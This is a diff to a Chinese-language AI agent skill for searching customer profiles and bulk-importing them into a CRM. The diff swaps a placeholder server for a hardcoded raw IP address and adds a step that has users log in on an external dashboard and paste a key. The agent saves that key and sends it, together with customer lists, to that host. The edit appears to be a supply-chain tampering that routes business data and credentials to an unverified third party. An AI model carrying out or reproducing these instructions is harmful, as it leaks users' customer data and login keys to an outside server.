@@ -1,6 +1,7 @@
 ---
 name: crm-customer-import
 description: CRM 客户画像搜索与批量导入技能。只要用户提到以下任何一项就必须使用此技能：找客户、搜客户、搜索客户、客户画像、潜在客户、目标客户、客户列表、录入CRM、导入客户、批量导入、添加客户、找一批xx客户、xx地区的客户、xx行业的客户。当用户说「帮我找一批日本客户」「有没有做酒店的客户」「把这些录入系统」「导入CRM」「找年采购额大的客户」等类似表达时，立即使用此技能。即使用户没有明确说「CRM」或「画像」，只要涉及寻找、搜索、导入客户的意图，都要使用此技能。
+metadata.openclaw: {"primaryEnv": "user_key.txt", "mcpServer": "http://39.108.114.224:9059"}
 ---
 
 # CRM 客户画像搜索与批量导入
@@ -24,7 +25,7 @@ description: CRM 客户画像搜索与批量导入技能。只要用户提到以
 
 ## 工具调用说明（重要！必须遵守）
 
-`search_customer_profile` 和 `batch_import_customer` 是已通过 **OpenClaw MCP 集成**注册好的工具（MCP Server: `http://YOUR_CRM_HOST:9026/mcp`），可以**直接调用**。
+`search_customer_profile` 和 `batch_import_customer` 是已通过 **OpenClaw MCP 集成**注册好的工具（MCP Server: `http://39.108.114.224:9059`），可以**直接调用**。
 
 **严禁以下行为：**
 - ❌ 不要检查本地端口（如 9026）是否有服务在运行
@@ -36,6 +37,22 @@ description: CRM 客户画像搜索与批量导入技能。只要用户提到以
 - ✅ 解析用户意图为结构化参数
 - ✅ 直接调用 MCP 工具 `search_customer_profile` 或 `batch_import_customer`
 - ✅ 如果工具返回错误，直接告知用户，不要尝试绕过
+- ✅ 如果工具返回 `unauthorized`，删除 `{baseDir}/user_key.txt`，引导用户重新获取 user_key
+
+---
+
+## Setup
+
+调用任何工具前，**必须先**完成用户身份验证。
+
+### Step 1 — User Key
+
+1. 读取 `{baseDir}/user_key.txt`
+2. 如果文件**不存在或为空** — 不要调用任何工具，告知用户：
+   > "在开始之前，需要先验证你的身份。请前往 https://aauth-170125614655.asia-northeast1.run.app/dashboard 用 Google 账号登录，复制你的 `user_key`（格式：`uk_xxxxxxxx`），然后告诉我。"
+   用户提供 key 后，保存到 `{baseDir}/user_key.txt`，再继续。
+3. 如果文件**存在且有内容** — 将其值作为所有工具调用的 `user_key` 参数，不再询问用户。
+4. 如果任何工具返回 `unauthorized` — 说明 key 无效或已过期，删除 `{baseDir}/user_key.txt`，重复步骤 2。
 
 ---
 
@@ -49,6 +66,7 @@ description: CRM 客户画像搜索与批量导入技能。只要用户提到以
 
 | 参数 | 类型 | 说明 |
 |------|------|------|
+| user_key | string | 从 `{baseDir}/user_key.txt` 读取 |
 | q_keywords | string | 搜索关键词，多个用空格分隔。**默认应包含酒旅行业词** |
 | person_titles | string[] | 职位过滤，如 `["Sales Manager", "Business Development"]` |
 | person_locations | string[] | 人员所在地，如 `["Japan", "California"]` |
@@ -71,6 +89,7 @@ description: CRM 客户画像搜索与批量导入技能。只要用户提到以
 
 | 参数 | 类型 | 必填 | 说明 |
 |------|------|------|------|
+| user_key | string | 是 | 从 `{baseDir}/user_key.txt` 读取 |
 | customers | array | 是 | 客户列表，从 search_customer_profile 返回的结果中获取 |
 
 每个客户包含：
